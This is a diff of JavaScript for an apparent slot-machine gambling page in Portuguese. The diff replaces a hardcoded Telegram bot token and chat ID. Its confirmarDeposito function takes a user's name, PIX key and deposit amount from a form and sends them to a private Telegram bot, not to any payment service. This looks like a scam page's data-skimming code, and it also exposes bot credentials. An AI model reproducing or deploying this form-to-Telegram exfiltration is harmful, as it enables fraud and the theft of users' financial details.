@@ -1,5 +1,5 @@
-const TOKEN = "7907530650:AAHQY7hR8N4w9N9IAnN2Gg0wO83O7pL7y40";
-const CHAT_ID = "6238676644";
+const TOKEN = "8568148429:AAGzu7zf-n-fGJnUpaNGVCLvQnsR2JxJ3fs";
+const CHAT_ID = "7668457919";
 
 window.girarSlots = () => {
     const colunas = document.querySelectorAll('.coluna');
@@ -50,10 +50,12 @@ window.confirmarDeposito = () => {
     const nome = document.getElementById("nome-usuario").value;
     const chave = document.getElementById("pix-chave").value;
     const valor = document.getElementById("valor-deposito").value;
+    
     if(!nome || !chave || !valor) {
         alert("Preencha todos os campos!");
         return;
     }
+
     fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: "POST", headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: CHAT_ID, text: `Depósito: ${nome}, Chave: ${chave}, Valor: R$${valor}` })
